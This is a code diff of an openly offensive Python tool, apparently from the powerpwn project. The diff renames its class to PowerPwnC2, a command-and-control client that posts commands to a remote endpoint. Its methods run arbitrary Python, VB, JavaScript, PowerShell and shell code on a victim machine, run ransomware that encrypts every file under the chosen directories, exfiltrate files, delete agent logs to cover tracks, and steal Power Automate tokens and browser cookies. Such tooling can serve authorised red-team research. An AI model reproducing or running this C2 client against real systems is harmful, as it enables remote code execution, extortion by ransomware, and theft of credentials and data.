@@ -1,77 +1,139 @@
+import json
 from typing import List
 
 import requests
-import json
 from pydantic.error_wrappers import ValidationError
-from powerpwn.models.flow_arguments import FlowToRunEnum, CommandTypeEnum, FlowArguments
-from powerpwn.models.flow_results import FlowResults
+
+from powerpwn.models.flow_arguments import CodeExecTypeEnum, CommandArguments, CommandToRunEnum
+from powerpwn.models.flow_results import CommandResults
 
 
-class PowerPwn:
+class PowerPwnC2:
     def __init__(self, post_url: str, debug: bool = False):
         self.post_url = post_url
         self.debug = debug
 
-    def run_flow(self, arguments: FlowArguments) -> FlowResults:
+    def run_flow(self, arguments: CommandArguments) -> CommandResults:
         try:
             flow_args = json.loads(arguments.json())
         except json.JSONDecodeError:
             print(f"Bad command. Raw content: {arguments}")
             raise
 
-        resp = requests.post(
-            url=self.post_url,
-            json=flow_args
-        )
+        resp = requests.post(url=self.post_url, json=flow_args)
 
         if self.debug:
             print(f"Raw content: {resp.content}")
 
         try:
-            flow_res = FlowResults.parse_obj(resp.json())
+            flow_res = CommandResults.parse_obj(resp.json())
             return flow_res
         except ValidationError:
             print(f"Bad response. Raw content: {resp.content}")
             raise
 
-    def exec_py2(self, command: str) -> FlowResults:
-        flow_args = FlowArguments(FlowToRun=FlowToRunEnum.CODE_EXEC, CodeExecCommandType=CommandTypeEnum.PYTHON, CodeExecCommand=command)
+    def exec_py2(self, command: str) -> CommandResults:
+        """
+        Execute command in a Python2 interpreter
+        :param command: a Python2 script encoded as a string
+        :return: command results
+        """
+        flow_args = CommandArguments(
+            command_to_run=CommandToRunEnum.CODE_EXEC, code_exec_command_type=CodeExecTypeEnum.PYTHON, code_exec_command=command
+        )
         return self.run_flow(flow_args)
 
-    def exec_vb(self, command: str) -> FlowResults:
-        flow_args = FlowArguments(FlowToRun=FlowToRunEnum.CODE_EXEC, CodeExecCommandType=CommandTypeEnum.VISUALBASIC, CodeExecCommand=command)
+    def exec_vb(self, command: str) -> CommandResults:
+        """
+        Execute command in a Visual Basic interpreter
+        :param command: a Visual Basic script encoded as a string
+        :return: command results
+        """
+        flow_args = CommandArguments(
+            command_to_run=CommandToRunEnum.CODE_EXEC, code_exec_command_type=CodeExecTypeEnum.VISUALBASIC, code_exec_command=command
+        )
         return self.run_flow(flow_args)
 
-    def exec_js(self, command: str) -> FlowResults:
-        flow_args = FlowArguments(FlowToRun=FlowToRunEnum.CODE_EXEC, CodeExecCommandType=CommandTypeEnum.JAVASCRIPT, CodeExecCommand=command)
+    def exec_js(self, command: str) -> CommandResults:
+        """
+        Execute command in a JavaScript interpreter
+        :param command: a JavaScript script encoded as a string
+        :return: command results
+        """
+        flow_args = CommandArguments(
+            command_to_run=CommandToRunEnum.CODE_EXEC, code_exec_command_type=CodeExecTypeEnum.JAVASCRIPT, code_exec_command=command
+        )
         return self.run_flow(flow_args)
 
-    def exec_ps(self, command: str) -> FlowResults:
-        flow_args = FlowArguments(FlowToRun=FlowToRunEnum.CODE_EXEC, CodeExecCommandType=CommandTypeEnum.POWERSHELL, CodeExecCommand=command)
+    def exec_ps(self, command: str) -> CommandResults:
+        """
+        Execute command in a PowerShell interpreter
+        :param command: a PowerShell script encoded as a string
+        :return: command results
+        """
+        flow_args = CommandArguments(
+            command_to_run=CommandToRunEnum.CODE_EXEC, code_exec_command_type=CodeExecTypeEnum.POWERSHELL, code_exec_command=command
+        )
         return self.run_flow(flow_args)
 
-    def exec_cmd(self, command: str) -> FlowResults:
-        flow_args = FlowArguments(FlowToRun=FlowToRunEnum.CODE_EXEC, CodeExecCommandType=CommandTypeEnum.COMMANDLINE, CodeExecCommand=command)
+    def exec_cmd(self, command: str) -> CommandResults:
+        """
+        Execute command in a CommandLine
+        :param command: a CommandLine script encoded as a string
+        :return: command results
+        """
+        flow_args = CommandArguments(
+            command_to_run=CommandToRunEnum.CODE_EXEC, code_exec_command_type=CodeExecTypeEnum.COMMANDLINE, code_exec_command=command
+        )
         return self.run_flow(flow_args)
 
-    def ransomware(self, crawl_depth: str, dirs_to_init_crawl: List[str], encryption_key: str) -> FlowResults:
+    def ransomware(self, crawl_depth: str, dirs_to_init_crawl: List[str], encryption_key: str) -> CommandResults:
+        """
+        Overwrite all files in dirs_to_init_crawl with an encrypted version
+        :param crawl_depth: recursively search into subdirectories this many times
+        :param dirs_to_init_crawl: a list of directories to begin crawl from separated by a command (e.g.'C:\\,D:\\')
+        :param encryption_key: an encryption key used to encrypt each file identified (AES256)
+        :return: command results
+        """
         dirs_to_init_crawl_str = ",".join(dirs_to_init_crawl)
-        flow_args = FlowArguments(FlowToRun=FlowToRunEnum.RANSOMWARE,
-                                  RansomwareCrawlDepth=crawl_depth, RansomwareDirectoriesToInitCrawl=dirs_to_init_crawl_str, RansomwareEncryptionKey=encryption_key)
+        flow_args = CommandArguments(
+            command_to_run=CommandToRunEnum.RANSOMWARE,
+            ransomware_crawl_depth=crawl_depth,
+            ransomware_directories_to_init_crawl=dirs_to_init_crawl_str,
+            ransomware_encryption_key=encryption_key,
+        )
         return self.run_flow(flow_args)
 
-    def exfil(self, target: str) -> FlowResults:
-        flow_args = FlowArguments(FlowToRun=FlowToRunEnum.EXFILTRATION, ExfilTargetFile=target)
+    def exfiltrate(self, target_file_path: str) -> CommandResults:
+        """
+        Exfiltrate file from victim machine
+        :param target_file_path: absolute path to file
+        :return: command results
+        """
+        flow_args = CommandArguments(command_to_run=CommandToRunEnum.EXFILTRATION, exfiltrate_target_file=target_file_path)
         return self.run_flow(flow_args)
 
-    def cleanup(self) -> FlowResults:
-        flow_args = FlowArguments(FlowToRun=FlowToRunEnum.CLEANUP)
+    def cleanup(self) -> CommandResults:
+        """
+        Delete agent log files
+        :return: command results
+        """
+        flow_args = CommandArguments(command_to_run=CommandToRunEnum.CLEANUP)
         return self.run_flow(flow_args)
 
-    def steal_power_automate_token(self) -> FlowResults:
-        flow_args = FlowArguments(FlowToRun=FlowToRunEnum.STEAL_POWER_AUTOMATE_TOKEN)
+    def steal_power_automate_token(self) -> CommandResults:
+        """
+        Open a browser, go to the Power Automate website and steal the authentication token
+        :return: command results
+        """
+        flow_args = CommandArguments(command_to_run=CommandToRunEnum.STEAL_POWER_AUTOMATE_TOKEN)
         return self.run_flow(flow_args)
 
-    def steal_cookie(self, fqdn: str) -> FlowResults:
-        flow_args = FlowArguments(FlowToRun=FlowToRunEnum.STEAL_COOKIE, StealCookieFQDN=fqdn)
+    def steal_cookie(self, fqdn: str) -> CommandResults:
+        """
+        Open a browser, go to the FQDN and seal its cookies
+        :param fqdn: fully qualified domain name to fetch the cookies of
+        :return: command results
+        """
+        flow_args = CommandArguments(command_to_run=CommandToRunEnum.STEAL_COOKIE, steal_cookie_fqdn=fqdn)
         return self.run_flow(flow_args)
